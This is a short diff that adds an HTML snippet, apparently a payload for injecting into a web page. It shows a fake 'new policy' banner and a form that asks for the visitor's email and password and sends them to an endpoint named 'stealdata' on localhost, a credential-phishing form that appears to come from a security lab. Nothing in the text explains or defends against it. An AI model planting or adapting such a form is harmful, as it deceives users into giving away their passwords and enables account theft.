@@ -1,0 +1,11 @@
+<h1> Please note our new policy! You now need to provide your email and password to post</h1>
+<form action='http://localhost:4000/stealdata' method='post'>
+
+<label for='email'>Email:</label>
+<input type='text' name='email'></input>
+<br>
+<label for='password'>Password:</label>
+<input type='password' name='password'>
+<br>
+<input type='submit' value='Authorize Post'>
+</form>
